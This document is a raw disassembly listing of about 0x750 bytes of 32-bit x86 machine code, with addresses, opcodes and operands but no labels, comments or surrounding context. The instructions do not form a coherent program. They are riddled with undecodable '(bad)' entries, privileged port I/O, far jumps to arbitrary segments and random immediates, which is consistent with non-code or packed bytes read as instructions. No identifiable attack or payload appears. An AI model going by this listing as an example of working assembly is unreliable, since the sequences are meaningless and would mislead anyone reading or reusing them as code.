  41c640:	sub    eax,0x1dab020b
  41c645:	std    
  41c646:	jecxz  0x41c62b
  41c648:	sub    al,0x8d
  41c64a:	ss loope 0x41c694
  41c64d:	sub    ch,0x68
  41c650:	cmc    
  41c651:	je     0x41c671
  41c653:	test   ecx,ebx
  41c655:	mov    eax,0x239f7238
  41c65a:	sahf   
  41c65b:	mov    cl,0x55
  41c65d:	in     al,0x1a
  41c65f:	out    dx,eax
  41c660:	xor    al,0x55
  41c662:	dec    ebx
  41c663:	and    eax,0x9ac0bf51
  41c668:	les    edx,FWORD PTR [esi+0x3ac43694]
  41c66e:	sahf   
  41c66f:	sbb    BYTE PTR [edx+0x4a],cl
  41c672:	enter  0x30ed,0xc2
  41c676:	push   esp
  41c677:	daa    
  41c678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c679:	hlt    
  41c67a:	inc    eax
  41c67b:	les    esp,FWORD PTR [ecx]
  41c67d:	fsub   QWORD PTR [ebp-0x61]
  41c680:	(bad)  
  41c681:	adc    dh,dl
  41c683:	dec    esp
  41c684:	lock mov eax,ds:0x68f75257
  41c68a:	adc    eax,0x38fd036e
  41c68f:	iret   
  41c690:	add    dh,BYTE PTR [ebp+0x4ec25a0b]
  41c696:	pop    ecx
  41c697:	loop   0x41c6bf
  41c699:	loope  0x41c674
  41c69b:	sub    ebx,DWORD PTR [ebx+ebx*2-0x251a50a4]
  41c6a2:	int    0x2d
  41c6a4:	stos   DWORD PTR es:[edi],eax
  41c6a5:	sub    bh,ah
  41c6a7:	leave  
  41c6a8:	into   
  41c6a9:	inc    eax
  41c6aa:	xor    al,0xf4
  41c6ac:	sar    BYTE PTR [ebp-0x558acad5],0xe7
  41c6b3:	xchg   ecx,eax
  41c6b4:	inc    ecx
  41c6b5:	into   
  41c6b6:	imul   eax,esp,0x45
  41c6b9:	es clc 
  41c6bb:	cdq    
  41c6bc:	inc    edx
  41c6bd:	shr    BYTE PTR [eax],1
  41c6bf:	push   ss
  41c6c0:	push   0xa
  41c6c2:	stc    
  41c6c3:	inc    ecx
  41c6c4:	pop    eax
  41c6c5:	adc    al,0x40
  41c6c7:	dec    edx
  41c6c8:	pop    es
  41c6c9:	mov    cl,0x1d
  41c6cb:	popa   
  41c6cc:	lods   al,BYTE PTR ds:[esi]
  41c6cd:	cmp    ah,bl
  41c6cf:	cli    
  41c6d0:	and    eax,0x8eda748a
  41c6d5:	jl     0x41c752
  41c6d7:	or     edx,eax
  41c6d9:	push   esp
  41c6da:	lea    esp,[ecx+eax*4]
  41c6dd:	stos   BYTE PTR es:[edi],al
  41c6de:	(bad)  
  41c6df:	rcr    DWORD PTR [ecx],1
  41c6e1:	sbb    BYTE PTR [edi+eiz*8],dl
  41c6e4:	not    cl
  41c6e6:	push   ecx
  41c6e7:	scas   eax,DWORD PTR es:[edi]
  41c6e8:	adc    DWORD PTR [edi],ecx
  41c6ea:	or     al,0xa
  41c6ec:	or     BYTE PTR [esi-0x48],bh
  41c6ef:	cli    
  41c6f0:	dec    ecx
  41c6f1:	xchg   DWORD PTR [ebx-0x6be760a4],ebp
  41c6f7:	cwde   
  41c6f8:	pop    edi
  41c6f9:	pop    edi
  41c6fa:	pusha  
  41c6fb:	dec    esi
  41c6fc:	shr    dl,1
  41c6fe:	xor    DWORD PTR [edi+eax*1],eax
  41c701:	aad    0xf8
  41c703:	aas    
  41c704:	cs sahf 
  41c706:	mov    ds,WORD PTR [ecx]
  41c708:	and    bl,bh
  41c70a:	pop    eax
  41c70b:	cli    
  41c70c:	js     0x41c714
  41c70e:	shl    BYTE PTR [edx],0x2
  41c711:	xor    al,0xb9
  41c713:	mov    ecx,DWORD PTR [ebx+0x4e1fa95e]
  41c719:	sub    DWORD PTR [eax-0x7],edx
  41c71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c71d:	mov    ebx,DWORD PTR [ebx-0x763e8428]
  41c723:	and    BYTE PTR [esi+0x4b],ch
  41c726:	xchg   ebp,eax
  41c727:	outs   dx,DWORD PTR ds:[esi]
  41c728:	test   BYTE PTR [eax+edi*8+0x375e6b63],al
  41c72f:	cmc    
  41c730:	mov    ebx,0xfb4a71b
  41c735:	out    0xc3,al
  41c737:	and    DWORD PTR [eax-0x4e43fe23],edi
  41c73d:	cmp    DWORD PTR [ecx],ebx
  41c73f:	pop    eax
  41c740:	jle    0x41c747
  41c742:	dec    ebp
  41c743:	and    dh,BYTE PTR [edi]
  41c745:	fnstenv [eax+0x5f]
  41c748:	jbe    0x41c776
  41c74a:	call   0x94b4:0xd10106e3
  41c751:	adc    BYTE PTR [esi+0x6e8f3f90],0x13
  41c758:	cmp    ecx,esi
  41c75a:	adc    bh,0xc6
  41c75d:	ins    BYTE PTR es:[edi],dx
  41c75e:	and    DWORD PTR [eax-0x6d3bedec],ebp
  41c764:	bound  esi,QWORD PTR [esi+esi*4+0x6dd64ccf]
  41c76b:	dec    ebx
  41c76c:	fbld   TBYTE PTR [edx-0x7f]
  41c76f:	mov    ah,BYTE PTR [ecx-0x40]
  41c772:	adc    BYTE PTR [ecx-0x19],ah
  41c775:	cmp    cl,al
  41c777:	stc    
  41c778:	lds    edi,FWORD PTR [ebp-0x4]
  41c77b:	add    dh,BYTE PTR [edi]
  41c77d:	mov    dh,0x54
  41c77f:	repnz mov esp,DWORD PTR ds:0xd4f7e1e0
  41c786:	mov    ecx,0x32ae5bb6
  41c78b:	es popf 
  41c78d:	fs inc ebp
  41c78f:	in     al,dx
  41c790:	(bad)  
  41c791:	inc    edi
  41c792:	jo     0x41c73f
  41c794:	dec    ecx
  41c795:	nop
  41c796:	out    0x72,al
  41c798:	inc    edx
  41c799:	fld    QWORD PTR [esi-0x3f44d06e]
  41c79f:	cmp    eax,0x4216b65a
  41c7a4:	dec    edx
  41c7a5:	xor    edi,edx
  41c7a7:	addr16 cmc 
  41c7a9:	or     esi,ecx
  41c7ab:	jp     0x41c814
  41c7ad:	loopne 0x41c7d5
  41c7af:	push   esp
  41c7b0:	pop    es
  41c7b1:	dec    edx
  41c7b2:	imul   esp,DWORD PTR [ebx],0x4a
  41c7b5:	or     al,0x75
  41c7b7:	xchg   esp,eax
  41c7b8:	dec    edx
  41c7b9:	xlat   BYTE PTR ds:[ebx]
  41c7ba:	inc    esp
  41c7bb:	adc    dl,ah
  41c7bd:	ins    BYTE PTR es:[edi],dx
  41c7be:	push   0xfe4af4ec
  41c7c3:	and    BYTE PTR [eax-0xd],dh
  41c7c6:	rcl    DWORD PTR [edx-0x70],1
  41c7c9:	sti    
  41c7ca:	out    0x39,eax
  41c7cc:	cdq    
  41c7cd:	and    DWORD PTR [esi+0x7b],eax
  41c7d0:	pop    eax
  41c7d1:	adc    eax,0x26c0988
  41c7d6:	outs   dx,BYTE PTR ds:[esi]
  41c7d7:	adc    al,0x34
  41c7d9:	pop    edx
  41c7da:	adc    eax,esi
  41c7dc:	gs ret 0xa9f5
  41c7e0:	sub    bl,cl
  41c7e2:	xchg   edi,eax
  41c7e3:	ret    0x395d
  41c7e6:	(bad)  
  41c7e7:	xchg   edx,eax
  41c7e8:	mov    ebx,0x4c30f7d9
  41c7ed:	leave  
  41c7ee:	mov    dl,0xa2
  41c7f0:	data16 mov bh,0x50
  41c7f3:	sub    eax,DWORD PTR [edx+0x45]
  41c7f6:	ret    
  41c7f7:	ds inc ecx
  41c7f9:	pop    ss
  41c7fa:	test   al,0x68
  41c7fc:	or     al,0xd1
  41c7fe:	pop    ss
  41c7ff:	outs   dx,DWORD PTR ds:[esi]
  41c800:	icebp  
  41c801:	sbb    al,0xe5
  41c803:	lods   eax,DWORD PTR ds:[esi]
  41c804:	push   esp
  41c805:	icebp  
  41c806:	pop    ecx
  41c807:	cmp    ch,BYTE PTR [esi-0x71]
  41c80a:	push   ebx
  41c80b:	cmp    al,0x13
  41c80d:	mov    dl,0xdf
  41c80f:	mov    bl,al
  41c811:	dec    DWORD PTR [esi]
  41c813:	push   ss
  41c814:	ss fs (bad) 
  41c817:	(bad)  
  41c818:	bound  eax,QWORD PTR ds:0xec6e9e44
  41c81e:	repnz test DWORD PTR [edi-0x38],ecx
  41c822:	adc    al,0xa0
  41c824:	jno    0x41c7b9
  41c826:	xor    al,0xee
  41c828:	or     BYTE PTR [ecx-0x67aea082],bl
  41c82e:	mov    DWORD PTR [ebx-0x6dad0fd8],edi
  41c834:	fisub  WORD PTR [ecx]
  41c836:	arpl   WORD PTR [ecx-0x55],bx
  41c839:	and    al,0x9c
  41c83b:	dec    esi
  41c83c:	aas    
  41c83d:	call   0x71d32606
  41c842:	call   0xc954:0x9a292ac4
  41c849:	mov    ah,0xbf
  41c84b:	ja     0x41c7d9
  41c84d:	fdiv   st(3),st
  41c84f:	push   es
  41c850:	sub    ebx,eax
  41c852:	add    eax,0x138fbb8c
  41c857:	sub    dl,BYTE PTR [esi]
  41c859:	cwde   
  41c85a:	pushf  
  41c85b:	outs   dx,DWORD PTR ds:[esi]
  41c85c:	add    cl,BYTE PTR [eax-0x594586c9]
  41c862:	push   esp
  41c863:	popa   
  41c864:	lds    ebp,FWORD PTR [esi-0x41a73e22]
  41c86a:	ret    
  41c86b:	aam    0x94
  41c86d:	fcomp  st(7)
  41c86f:	shl    ebp,0x35
  41c872:	jo     0x41c7f7
  41c874:	hlt    
  41c875:	data16 and BYTE PTR [esp+edx*2-0x52d7d32a],0x79
  41c87e:	mov    ebx,0xa051710
  41c883:	mov    BYTE PTR [edi+0x6e],dl
  41c886:	push   0x7
  41c888:	sub    eax,0x214789d3
  41c88d:	into   
  41c88e:	or     bl,BYTE PTR [edx+0x1f65dab6]
  41c894:	xchg   edx,eax
  41c895:	sti    
  41c896:	imul   edx,DWORD PTR [ebx],0xb7ec4bf8
  41c89c:	pusha  
  41c89d:	sub    al,0x25
  41c89f:	xor    eax,0x3ccbdda1
  41c8a4:	and    al,0x3
  41c8a6:	xchg   edx,eax
  41c8a7:	sbb    esi,ecx
  41c8a9:	aas    
  41c8aa:	mov    ds:0x94950757,al
  41c8af:	jmp    DWORD PTR [ecx-0x3e4094bf]
  41c8b5:	call   FWORD PTR [ecx-0x4e320ff]
  41c8bb:	lock arpl WORD PTR [ebx+0x7a],dx
  41c8bf:	jo     0x41c891
  41c8c1:	jo     0x41c84a
  41c8c3:	arpl   cx,bx
  41c8c5:	sub    BYTE PTR [edi-0x1c],bl
  41c8c8:	cmp    dl,al
  41c8ca:	iret   
  41c8cb:	js     0x41c85a
  41c8cd:	lahf   
  41c8ce:	xchg   esi,eax
  41c8cf:	arpl   WORD PTR [esi],bp
  41c8d1:	sbb    al,0x61
  41c8d3:	fadd   QWORD PTR [eax+0x12]
  41c8d6:	jae    0x41c92d
  41c8d8:	jmp    0x41c880
  41c8da:	call   0x3479:0x7251826e
  41c8e1:	xchg   dh,bh
  41c8e3:	lods   eax,DWORD PTR ds:[esi]
  41c8e4:	push   ss
  41c8e5:	add    ebp,DWORD PTR [ebx+0xdcca79]
  41c8eb:	ret    0x7d51
  41c8ee:	cmp    ebp,DWORD PTR [ebx-0x6f]
  41c8f1:	adc    cl,BYTE PTR [edi-0x684d02fe]
  41c8f7:	shl    BYTE PTR [esi+ebx*1],cl
  41c8fa:	push   eax
  41c8fb:	xor    al,0x8
  41c8fd:	mov    al,0x8f
  41c8ff:	sbb    dh,BYTE PTR [esi]
  41c901:	imul   edx,DWORD PTR [eax-0x18abc814],0x938682df
  41c90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c90c:	bound  esi,QWORD PTR [esi]
  41c90e:	lds    ebx,FWORD PTR [eax+0x64d7d74]
  41c914:	dec    ebx
  41c915:	ja     0x41c987
  41c917:	in     al,0x9a
  41c919:	icebp  
  41c91a:	imul   esp,ebp,0xffffffeb
  41c91d:	xchg   ebx,eax
  41c91e:	mov    eax,0x8ac05ad3
  41c923:	jp     0x41c8cf
  41c925:	nop
  41c926:	add    cl,BYTE PTR [eax+0x75a01d0c]
  41c92c:	fs inc esi
  41c92e:	test   BYTE PTR [ebx-0x8e61f07],cl
  41c934:	shr    BYTE PTR [ebp+ecx*2+0x36],1
  41c938:	ja     0x41c96c
  41c93a:	jmp    0xf70c:0x31b96709
  41c941:	jmp    0x8dd4:0xf5c3e2fb
  41c948:	xchg   ebp,eax
  41c949:	loope  0x41c8fe
  41c94b:	rcr    BYTE PTR [esi],cl
  41c94d:	pop    ebx
  41c94f:	push   es
  41c950:	in     eax,dx
  41c951:	and    BYTE PTR [eax+0x5b],0xb0
  41c955:	mov    al,ds:0x9ba8e727
  41c95a:	xor    BYTE PTR [ecx],dl
  41c95c:	push   esp
  41c95d:	outs   dx,BYTE PTR ds:[esi]
  41c95e:	xchg   DWORD PTR fs:[ecx-0x6e],esi
  41c962:	and    esi,DWORD PTR [esi]
  41c964:	daa    
  41c965:	adc    eax,DWORD PTR [edi+0x3f07c44e]
  41c96b:	cmp    al,0xb4
  41c96d:	jmp    0xf2cb2b6e
  41c972:	xchg   ebx,eax
  41c973:	dec    edx
  41c974:	mov    cs,WORD PTR [edx]
  41c976:	mov    dh,BYTE PTR [eax+0x57]
  41c979:	push   cs
  41c97a:	push   ecx
  41c97b:	aad    0xc6
  41c97d:	cmp    al,0x6
  41c97f:	mov    ah,0x1f
  41c981:	inc    ecx
  41c982:	(bad)  
  41c986:	jmp    0x289cf5f1
  41c98b:	maskmovq mm3,(bad)
  41c98c:	neg    DWORD PTR [ebx]
  41c98e:	sbb    al,0x5e
  41c990:	inc    ebx
  41c991:	cmp    al,dh
  41c993:	xchg   edx,eax
  41c994:	cwde   
  41c995:	sbb    esi,ebp
  41c997:	out    0x88,eax
  41c999:	js     0x41c9d3
  41c99b:	xchg   esp,eax
  41c99c:	imul   edi,edx,0xffffffd1
  41c99f:	mov    eax,es:0x2a9c54
  41c9a5:	jb     0x41ca21
  41c9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9a8:	adc    DWORD PTR [ebp+0xca25636],ecx
  41c9ae:	test   DWORD PTR [esi-0x17d42f1f],ebx
  41c9b4:	pop    esi
  41c9b5:	ins    BYTE PTR es:[edi],dx
  41c9b6:	jg     0x41c96c
  41c9b8:	loop   0x41c9b8
  41c9ba:	push   edx
  41c9bb:	out    dx,al
  41c9bc:	xor    al,0xf8
  41c9be:	enter  0xf844,0x7a
  41c9c2:	loopne 0x41c9cb
  41c9c4:	mov    eax,ds:0x5069d13a
  41c9c9:	cwd    
  41c9cb:	into   
  41c9cc:	inc    dl
  41c9ce:	stos   BYTE PTR es:[edi],al
  41c9cf:	in     eax,dx
  41c9d0:	nop
  41c9d1:	cdq    
  41c9d2:	mov    ebx,0x92c5abf8
  41c9d7:	sahf   
  41c9d8:	ficom  DWORD PTR [ebx]
  41c9da:	jge    0x41c9d6
  41c9dc:	ret    
  41c9dd:	mov    DWORD PTR [edi+edi*4-0x31c115e0],esi
  41c9e4:	data16 sub al,0x78
  41c9e7:	push   ds
  41c9e8:	out    dx,eax
  41c9e9:	push   ss
  41c9ea:	and    edi,ebp
  41c9ec:	mov    WORD PTR [ebp+0x57c9ef55],ss
  41c9f2:	ret    
  41c9f3:	inc    esp
  41c9f4:	mov    BYTE PTR [ecx+ebx*2],bh
  41c9f7:	mov    ah,0xe1
  41c9f9:	push   ebp
  41c9fa:	mov    bh,0x43
  41c9fc:	ss scas al,BYTE PTR es:[edi]
  41c9fe:	stc    
  41c9ff:	pop    ecx
  41ca00:	jp     0x41ca22
  41ca02:	fsub   DWORD PTR [ebp+edx*4+0x2fe1c6ca]
  41ca09:	ss ret 0x3fa4
  41ca0d:	xchg   DWORD PTR [ebp+0x2a],ebx
  41ca10:	dec    esi
  41ca11:	lahf   
  41ca12:	or     eax,0x99aecf93
  41ca17:	fs scas eax,DWORD PTR es:[edi]
  41ca19:	mov    edi,0xd78b3acb
  41ca1e:	out    0xda,eax
  41ca20:	dec    edi
  41ca21:	jp     0x41ca3e
  41ca23:	lods   eax,DWORD PTR ds:[esi]
  41ca24:	cmp    edx,ecx
  41ca26:	or     edi,DWORD PTR [esi-0x53]
  41ca29:	mov    esi,DWORD PTR [ebx+eiz*4+0x71]
  41ca2d:	popf   
  41ca2e:	xlat   BYTE PTR ds:[ebx]
  41ca2f:	mov    DWORD PTR ds:0x6e647578,edi
  41ca35:	mov    ebx,0x5aea7bc5
  41ca3a:	in     eax,dx
  41ca3b:	inc    eax
  41ca3c:	push   ebp
  41ca3d:	sbb    ebx,ecx
  41ca3f:	out    dx,al
  41ca40:	push   edi
  41ca41:	bound  edi,QWORD PTR [ebx+0xdfc1f1a]
  41ca47:	cmp    al,0x99
  41ca49:	jecxz  0x41ca08
  41ca4b:	cmp    ebp,DWORD PTR [edi+0x3d433c1e]
  41ca51:	inc    esi
  41ca52:	jmp    0xd64fdedb
  41ca57:	cmp    BYTE PTR [ebx],ah
  41ca59:	mov    dl,0x4
  41ca5b:	xor    esp,esp
  41ca5d:	out    dx,eax
  41ca5e:	adc    DWORD PTR [esi+ebx*8+0x73854f7],esp
  41ca65:	xor    ecx,0xfffffff2
  41ca68:	dec    ecx
  41ca69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca6a:	inc    ebp
  41ca6b:	(bad)  
  41ca6c:	and    BYTE PTR [edx+0x62],0xca
  41ca70:	mov    dl,0xfd
  41ca72:	xchg   DWORD PTR [esp+eiz*8],edx
  41ca75:	sub    al,BYTE PTR [edx-0x71]
  41ca78:	inc    edi
  41ca79:	int3   
  41ca7a:	pop    esp
  41ca7b:	sub    ah,BYTE PTR [ebp+0x7cc31264]
  41ca81:	jae    0x41ca92
  41ca83:	and    al,0xfb
  41ca85:	outs   dx,DWORD PTR ds:[esi]
  41ca86:	popa   
  41ca87:	xchg   DWORD PTR [ebx-0x4f],edx
  41ca8a:	pop    ss
  41ca8b:	xor    dl,al
  41ca8d:	jb     0x41ca1f
  41ca8f:	fimul  WORD PTR [eax+0x14]
  41ca92:	mov    bh,0x68
  41ca94:	test   al,0x87
  41ca96:	xchg   ebx,eax
  41ca97:	fst    DWORD PTR [esi]
  41ca99:	div    BYTE PTR [ecx+0x3]
  41ca9c:	loop   0x41ca8f
  41ca9e:	push   ebx
  41ca9f:	(bad)  
  41caa0:	aas    
  41caa1:	xchg   ecx,eax
  41caa2:	sub    DWORD PTR [edi-0x36afbb2],edi
  41caa8:	mov    eax,ds:0x27629776
  41caad:	nop
  41caae:	push   edx
  41caaf:	rol    BYTE PTR [ecx-0x16b3442e],cl
  41cab5:	fsubrp st(3),st
  41cab7:	enter  0x1f26,0xf9
  41cabb:	mul    BYTE PTR [edx-0x35]
  41cabe:	and    eax,0xc1675ef4
  41cac3:	in     al,0x81
  41cac5:	sbb    cl,0x69
  41cac8:	xor    esp,DWORD PTR [ebx]
  41caca:	jl     0x41ca93
  41cacc:	lods   al,BYTE PTR ds:[esi]
  41cacd:	mov    dh,0x7b
  41cacf:	stc    
  41cad0:	out    dx,al
  41cad1:	cdq    
  41cad2:	mov    esi,DWORD PTR [eax+0x72]
  41cad5:	push   eax
  41cad6:	pop    esp
  41cad7:	bnd ret 0xe086
  41cadb:	xchg   ecx,eax
  41cadc:	dec    esp
  41cadd:	or     DWORD PTR ds:[esi-0x4a6c41e0],0x55
  41cae5:	mov    BYTE PTR [ebp-0x1459af27],ah
  41caeb:	call   0xc2c27903
  41caf0:	bound  ebp,QWORD PTR [esi+0x404ff20e]
  41caf6:	addr16 mov ebp,0x38c1380c
  41cafc:	hlt    
  41cafd:	jecxz  0x41cb54
  41caff:	mov    bl,0x75
  41cb01:	push   0xffffffc2
  41cb03:	loop   0x41cb3e
  41cb05:	xor    ebx,esp
  41cb07:	pushf  
  41cb08:	nop
  41cb09:	sub    edi,ebx
  41cb0b:	popf   
  41cb0c:	mov    bl,0x71
  41cb0e:	push   ds
  41cb0f:	jmp    0x41caa8
  41cb11:	jnp    0x41cb46
  41cb13:	fstp   DWORD PTR [eax+0x31609ea]
  41cb19:	jno    0x41cb4e
  41cb1b:	mov    edx,0x42c9838d
  41cb20:	fmulp  st(0),st
  41cb22:	lods   al,BYTE PTR ds:[esi]
  41cb23:	out    0xd7,al
  41cb25:	in     eax,0xe0
  41cb27:	pop    esi
  41cb28:	mov    al,ds:0x2910f6f7
  41cb2d:	dec    esi
  41cb2e:	add    eax,0xce776e97
  41cb33:	icebp  
  41cb34:	inc    edx
  41cb35:	lods   eax,DWORD PTR ds:[esi]
  41cb36:	mov    eax,0x8b893e9b
  41cb3b:	fwait
  41cb3c:	sbb    edx,DWORD PTR ss:[edx-0x3a68d223]
  41cb43:	test   DWORD PTR [ecx+0xd],eax
  41cb46:	out    0x47,eax
  41cb48:	imul   eax,ebx,0x729d62bb
  41cb4e:	fidivr WORD PTR [edx]
  41cb50:	(bad)  
  41cb51:	movd   DWORD PTR [ebp+0x66],mm0
  41cb55:	loope  0x41cbd5
  41cb57:	push   ecx
  41cb58:	lods   al,BYTE PTR ds:[esi]
  41cb59:	jl     0x41cafb
  41cb5b:	add    al,0xc8
  41cb5d:	inc    ecx
  41cb5e:	bound  edi,QWORD PTR ds:0x265ef74a
  41cb64:	inc    eax
  41cb65:	iret   
  41cb66:	sbb    DWORD PTR [eax+0x596f1a93],0xffffffb5
  41cb6d:	lods   al,BYTE PTR ds:[esi]
  41cb6e:	mov    ah,0xfc
  41cb70:	out    dx,al
  41cb71:	inc    edx
  41cb72:	or     eax,0xc4d1f229
  41cb77:	dec    esp
  41cb78:	xchg   esi,eax
  41cb79:	mov    DWORD PTR [ecx+ebx*2],0x295c1c67
  41cb80:	and    al,0xe5
  41cb82:	or     al,0x4d
  41cb84:	adc    bl,BYTE PTR ds:[edi+0x54]
  41cb88:	cmp    eax,0xc9a194a9
  41cb8d:	or     ch,bh
  41cb8f:	cmp    ebx,DWORD PTR [ecx-0x6382ceaf]
  41cb95:	test   DWORD PTR [eax+0xa167594],0x64e65abf
  41cb9f:	icebp  
  41cba0:	mov    al,0x88
  41cba2:	inc    edi
  41cba3:	sbb    DWORD PTR [esi-0x3e],ebp
  41cba6:	shl    bl,cl
  41cba8:	cdq    
  41cba9:	popa   
  41cbaa:	shl    DWORD PTR ds:0xaaa37db1,cl
  41cbb0:	or     ecx,DWORD PTR [edi]
  41cbb2:	pop    ds
  41cbb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb4:	and    eax,0xc4e8835
  41cbb9:	mov    ds:0xfaa55f6d,al
  41cbbe:	in     al,dx
  41cbbf:	xchg   esp,eax
  41cbc0:	and    bl,bl
  41cbc2:	inc    ebx
  41cbc3:	leave  
  41cbc4:	in     al,dx
  41cbc5:	loopne 0x41cb95
  41cbc7:	es jo  0x41cb73
  41cbca:	cmp    ebx,ebp
  41cbcc:	sub    al,0x93
  41cbce:	mov    edx,0x4727f454
  41cbd3:	xor    al,0x3d
  41cbd5:	ds loopne 0x41cbdf
  41cbd8:	pop    ebp
  41cbd9:	lock sbb edi,ebx
  41cbdc:	xchg   ebp,eax
  41cbdd:	mov    ebx,0x4fbd5fca
  41cbe2:	add    BYTE PTR [edx+0x68bfa6a3],cl
  41cbe8:	xchg   BYTE PTR [eax],dl
  41cbea:	push   esi
  41cbeb:	ss js  0x41cc53
  41cbee:	pop    edx
  41cbef:	rcr    DWORD PTR [edi-0x3e347e07],1
  41cbf5:	popf   
  41cbf6:	push   cs
  41cbf7:	in     al,dx
  41cbf8:	pop    esi
  41cbf9:	sbb    DWORD PTR [edi],ecx
  41cbfb:	cwde   
  41cbfc:	jo     0x41cba0
  41cbfe:	dec    esp
  41cbff:	ins    BYTE PTR es:[edi],dx
  41cc00:	aas    
  41cc01:	dec    ebx
  41cc02:	pop    edx
  41cc03:	add    al,0x2f
  41cc05:	lods   eax,DWORD PTR ds:[esi]
  41cc06:	inc    esi
  41cc07:	dec    ebp
  41cc08:	mov    eax,ecx
  41cc0a:	cmp    al,dh
  41cc0c:	(bad)  [eax+0x60]
  41cc0f:	jns    0x41cc46
  41cc11:	and    ebp,0xfffffff8
  41cc14:	loope  0x41cbd2
  41cc16:	stos   BYTE PTR es:[edi],al
  41cc17:	sbb    ebp,edx
  41cc19:	imul   edx,DWORD PTR [eax+0x70],0x1874ef74
  41cc20:	pop    esi
  41cc21:	xor    eax,0xc251ecc7
  41cc26:	adc    esp,eax
  41cc28:	mov    WORD PTR [ebx+0x4933ecb8],ss
  41cc2e:	cmc    
  41cc2f:	jge    0x41cc22
  41cc31:	xor    BYTE PTR [esi+0x574b3539],ch
  41cc37:	adc    DWORD PTR [ebx],ecx
  41cc39:	loopne 0x41ccac
  41cc3b:	pusha  
  41cc3c:	inc    esi
  41cc3d:	call   0x765b:0x20e7a4af
  41cc44:	pop    ecx
  41cc45:	mov    edx,edx
  41cc47:	or     eax,0x34f95ef7
  41cc4c:	or     al,BYTE PTR [edx+0x23]
  41cc4f:	mov    ch,0xf6
  41cc51:	loop   0x41cbd9
  41cc53:	xchg   esi,eax
  41cc54:	lds    ebp,FWORD PTR [esi+0x2f]
  41cc57:	jae    0x41ccad
  41cc59:	sbb    BYTE PTR [edi],cl
  41cc5b:	pop    esi
  41cc5c:	or     DWORD PTR [esi],edi
  41cc5e:	mov    ds:0xe343f12a,al
  41cc63:	jns    0x41ccde
  41cc65:	pop    esp
  41cc66:	pop    es
  41cc67:	mov    cs,WORD PTR [ebx-0x6c]
  41cc6a:	mov    ds:0x69bddfdc,eax
  41cc6f:	icebp  
  41cc70:	mov    ds:0xe614e691,eax
  41cc75:	arpl   WORD PTR [ebx],si
  41cc77:	cmp    edi,DWORD PTR [esi]
  41cc79:	jnp    0x41cce8
  41cc7b:	and    esp,DWORD PTR [ecx]
  41cc7d:	out    0x1e,al
  41cc7f:	xor    eax,0xbcbf8c3a
  41cc84:	jno    0x41cc0b
  41cc86:	add    BYTE PTR ds:0xae6e3f4f,cl
  41cc8c:	xchg   ebp,eax
  41cc8d:	pop    edi
  41cc8e:	push   ecx
  41cc8f:	cmp    eax,0x4f0b5f51
  41cc94:	fs sbb eax,0x5b009b48
  41cc9a:	mov    edi,0x148ada80
  41cc9f:	ror    esi,1
  41cca1:	imul   esp,DWORD PTR [ebp+0x6e4c57a],0x91e19f5b
  41ccab:	dec    eax
  41ccac:	scas   al,BYTE PTR es:[edi]
  41ccad:	inc    esp
  41ccae:	or     BYTE PTR [edx+0x1b4ba3ee],bh
  41ccb4:	xchg   dl,ah
  41ccb6:	icebp  
  41ccb7:	icebp  
  41ccb8:	jb     0x41cd2e
  41ccba:	out    dx,al
  41ccbb:	test   DWORD PTR [edi],ebx
  41ccbd:	mov    eax,ds:0xb837cfa1
  41ccc2:	(bad)  [ecx-0x2a]
  41ccc5:	je     0x41cc4d
  41ccc7:	aaa    
  41ccc8:	xchg   DWORD PTR [ecx+edi*1],ebp
  41cccb:	dec    esi
  41cccc:	sbb    cl,dh
  41ccce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cccf:	gs sbb al,0x27
  41ccd2:	sbb    BYTE PTR [edi-0xc],cl
  41ccd5:	cmp    al,BYTE PTR [eax+0x62]
  41ccd8:	jge    0x41cd06
  41ccda:	push   edi
  41ccdb:	leave  
  41ccdc:	adc    al,0xb4
  41ccde:	fdivr  DWORD PTR [edx-0x64]
  41cce1:	jo     0x41cc63
  41cce3:	adc    bl,BYTE PTR [ebx+0x5474df4b]
  41cce9:	shr    DWORD PTR [esi],1
  41cceb:	inc    ecx
  41ccec:	push   eax
  41cced:	cmp    DWORD PTR ds:0x88e39e77,edi
  41ccf3:	popf   
  41ccf4:	add    ah,BYTE PTR [edx+0x277ea114]
  41ccfa:	mov    ds:0x58534e45,eax
  41ccff:	pushf  
  41cd00:	call   0xb19:0x9314c089
  41cd07:	mov    eax,0xb0c5682d
  41cd0c:	ret    
  41cd0d:	and    BYTE PTR [ecx-0x2a],0x52
  41cd11:	aad    0xc5
  41cd13:	adc    BYTE PTR [edx+0x286264a6],dh
  41cd19:	repnz xchg edi,eax
  41cd1b:	(bad)  
  41cd1c:	sti    
  41cd1d:	xchg   esi,eax
  41cd1e:	dec    esi
  41cd1f:	add    edi,DWORD PTR [ebx+ecx*1-0x72]
  41cd23:	jmp    0xb5f9:0xccee2ef9
  41cd2a:	enter  0x693b,0x89
  41cd2e:	jge    0x41ccb8
  41cd30:	jb     0x41cccf
  41cd32:	sub    eax,0x99893c72
  41cd37:	out    dx,eax
  41cd38:	mov    DWORD PTR [ebp+0x13104eb2],eax
  41cd3e:	xchg   ebx,eax
  41cd3f:	xchg   ecx,eax
  41cd40:	pop    edi
  41cd41:	xchg   ebx,eax
  41cd42:	fsub   QWORD PTR [esi+0x5e2be241]
  41cd48:	sar    BYTE PTR [ebx-0x679e8a90],1
  41cd4e:	test   BYTE PTR [ebx+0x6f],bh
  41cd51:	ror    BYTE PTR [eax+0x0],cl
  41cd54:	fisub  DWORD PTR [ebx+0x2e]
  41cd57:	cwde   
  41cd58:	mov    esi,0x18cc95a7
  41cd5d:	nop
  41cd5e:	mov    ah,BYTE PTR [edx]
  41cd60:	sub    eax,DWORD PTR [eax]
  41cd62:	push   edi
  41cd63:	fcmovne st,st(7)
  41cd65:	fst    DWORD PTR [ebp+ecx*2-0x1b84d054]
  41cd6c:	call   0x94eaa3d2
  41cd71:	sub    al,cl
  41cd73:	push   ds
  41cd74:	mov    bh,0xbb
  41cd76:	sub    BYTE PTR [ebx-0x10863300],dh
  41cd7c:	adc    eax,eax
  41cd7e:	mov    bh,0x3b
  41cd80:	sbb    DWORD PTR [ecx-0x59f9d5a2],edx
  41cd86:	aaa    
  41cd87:	popf   
  41cd88:	fld    TBYTE PTR [ebp+0x4d]
  41cd8b:	dec    ebp
